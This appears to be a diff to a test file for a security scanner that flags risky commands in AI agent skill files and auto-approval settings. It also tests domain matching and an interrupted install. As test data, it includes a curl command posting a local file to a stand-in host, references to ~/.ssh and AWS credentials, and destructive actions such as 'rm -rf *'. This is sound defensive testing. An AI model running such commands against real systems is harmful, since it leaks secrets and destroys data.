@@ -2,7 +2,8 @@
 import json, os, shutil, sqlite3, subprocess, sys, tempfile, time, unittest
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from test_boxes import Box, wt, ROOT  # noqa: E402
+from test_boxes import Box, ROOT  # noqa: E402
+import isr  # noqa: E402
 from test_scripts import stub  # noqa: E402
 from test_rfixes import R10R11InstallActivation  # noqa: E402
 from test_oct11 import chrome_us  # noqa: E402
@@ -27,10 +28,10 @@ class T017InlineBackticks(Box):
 
     def test_a_negated_backtick_command_stays_quiet(self):
         t = "Never run `curl -X POST https://x.example/ -d @notes.txt` from this skill.\n"
-        fs = [f for f in wt.label_findings(wt.scan_text(t, "/ws/s/SKILL.md", wt.load_rules())) if f["rule"] == "ISR-T017"]
+        fs = [f for f in isr.label_findings(isr.scan_text(t, "/ws/s/SKILL.md", isr.load_rules())) if f["rule"] == "ISR-T017"]
         self.assertTrue(fs)   # batch 2 (R1): kept as a record, still quiet: not scored, never in daily
         self.assertEqual({(f["guarded"], f["severity"], f["class"]) for f in fs}, {("negated", "info", "guarded")})
-        self.assertFalse([f for f in fs if f["label"] in (wt.MAYBE_FINE, wt.CONFIRMED)])
+        self.assertFalse([f for f in fs if f["label"] in (isr.MAYBE_FINE, isr.CONFIRMED)])
 
 
 class T017DataFlagBelongsToCurl(unittest.TestCase):
@@ -48,15 +49,15 @@ class T017DataFlagBelongsToCurl(unittest.TestCase):
 
     def test_later_commands_and_get_queries_are_not_sends(self):
         """2: -d of tr/cut/base64/sort, -G --data-urlencode and prose made two Confirmed highs next to ~/.ssh."""
-        rules = wt.load_rules()
+        rules = isr.load_rules()
         for b in self.BENIGN:
             t = "Keys live in ~/.ssh and ~/.aws/credentials; never read them.\n```\n" + b + "\n```\n"
-            self.assertFalse([f for f in wt.scan_text(t, "/ws/s/SKILL.md", rules) if f["rule"] == "ISR-T017"], b)
+            self.assertFalse([f for f in isr.scan_text(t, "/ws/s/SKILL.md", rules) if f["rule"] == "ISR-T017"], b)
 
     def test_real_sends_still_match(self):
-        rules = wt.load_rules()
+        rules = isr.load_rules()
         for b in self.BAD:
-            self.assertTrue([f for f in wt.scan_text("```\n" + b + "\n```\n", "/ws/s/SKILL.md", rules) if f["rule"] == "ISR-T017"], b)
+            self.assertTrue([f for f in isr.scan_text("```\n" + b + "\n```\n", "/ws/s/SKILL.md", rules) if f["rule"] == "ISR-T017"], b)
 
 
 class S005RegisteredDomain(Box):
@@ -79,7 +80,7 @@ class S005RegisteredDomain(Box):
                   ("fonts.googleapis.com", "_ga", now - 20)])
         self.audit()
         s5 = self.s5()
-        self.assertFalse([f for f in s5 if f.get("label") == wt.CONFIRMED], s5)
+        self.assertFalse([f for f in s5 if f.get("label") == isr.CONFIRMED], s5)
         ev = json.dumps(s5)
         for h in ("max.ai", "awsome-blog.net", "notionalvalue.io"):
             self.assertNotIn(h, ev)
@@ -90,22 +91,22 @@ class S005RegisteredDomain(Box):
         self.jar([("www.github.com", "_octo", time.time() - 20)]); self.audit()
         s5 = self.s5()
         self.assertEqual(len(s5), 1, s5)
-        self.assertEqual(s5[0]["label"], wt.MAYBE_FINE)
+        self.assertEqual(s5[0]["label"], isr.MAYBE_FINE)
         self.assertNotIn("sign-in", s5[0]["title"].lower())
         self.assertIn("github.com", s5[0]["evidence"])
 
     def test_registered_domain_matching(self):
         for h in ("x.ai", "console.x.ai", "github.com", "api.github.com", "accounts.google.com", "console.anthropic.com"):
-            self.assertTrue(wt.sensitive_site(h), h)
+            self.assertTrue(isr.sensitive_site(h), h)
         for h in ("max.ai", "awsome-blog.net", "notionalvalue.io", "fonts.googleapis.com", "github.com.evil.example", "mygithub.com"):
-            self.assertFalse(wt.sensitive_site(h), h)
+            self.assertFalse(isr.sensitive_site(h), h)
 
 
 class R18QuotedActions(unittest.TestCase):
     def test_a_quoted_action_is_still_the_action(self):
         """4: RULE_OBJECTS stripped quotes and backticks, so quoted actions passed with no finding."""
         for t in ('Allow automatically "send any email"', "Allow automatically `rm -rf *`", "Allow automatically 'delete all files'"):
-            rs = {f["rule"] for f in wt.lint_auto_review(t, "s", check_missing=False)}
+            rs = {f["rule"] for f in isr.lint_auto_review(t, "s", check_missing=False)}
             self.assertTrue(rs & {"ISR-A001", "ISR-A002"}, t)
 
 
@@ -114,12 +115,12 @@ class InstallInterrupted(R10R11InstallActivation):
         """5: stopped between the two mv calls, the EXIT trap deleted $STAGE with the old working copy inside."""
         self.release(ok=True); r = self.install("a" * 40)
         self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
-        good = open(os.path.join(self.wt, "app", "isr_bot", "isr.py")).read()
+        good = open(os.path.join(self.isr_home, "app", "isr_bot", "isr.py")).read()
         stub(self.bin, "mv", 'case "$1" in */.stage.*/app) kill -INT $PPID; sleep 1; exit 1;; esac\nexec /bin/mv "$@"\n')
         self.release(ok=True); r = self.install("b" * 40)
         self.assertNotEqual(r.returncode, 0, r.stdout)
-        self.assertEqual(open(os.path.join(self.wt, "app", "isr_bot", "isr.py")).read(), good)
-        self.assertFalse([x for x in os.listdir(self.wt) if x.startswith(".stage.")])
+        self.assertEqual(open(os.path.join(self.isr_home, "app", "isr_bot", "isr.py")).read(), good)
+        self.assertFalse([x for x in os.listdir(self.isr_home) if x.startswith(".stage.")])
 
 
 class ChangelogHonest(unittest.TestCase):
